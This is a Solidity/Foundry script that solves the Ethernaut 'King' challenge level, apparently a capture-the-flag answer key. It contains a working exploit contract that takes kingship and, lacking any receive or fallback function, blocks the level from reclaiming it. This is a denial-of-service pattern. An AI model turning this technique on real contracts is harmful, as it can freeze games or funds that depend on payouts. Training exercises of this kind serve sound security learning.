// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
import {King} from "../src/King.sol";

/**
 *
 * Level address: 0x3049C00639E6dfC269ED1451764a046f7aE500c6
 * The contract below represents a very simple game:
 * whoever sends it an amount of ether that is larger than
 * the current prize becomes the new king.
 * On such an event, the overthrown king gets paid the new prize,
 * making a bit of ether in the process! As ponzi as it gets xD
 *
 * Such a fun game. Your goal is to break it.
 *
 * When you submit the instance back to the level,
 * the level is going to reclaim kingship.
 * You will beat the level if you can avoid such a self proclamation.
 *
 */
contract Pwn {
    King victim;

    constructor(King _victim) {
        victim = _victim;
    }

    function attack() public payable {
        (bool success,) = address(victim).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // Prevent self proclamation
    // NO falback and receive functions
}

contract KingScript is Attacker {
    Level private level = Level(0x3049C00639E6dfC269ED1451764a046f7aE500c6);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level, 0.001 ether);
        King king = King(payable(instance));

        Pwn pwn = new Pwn(king);
        pwn.attack{value: 0.001 ether + 1 wei}();

        require(submitInstance());
        vm.stopBroadcast();
    }
}
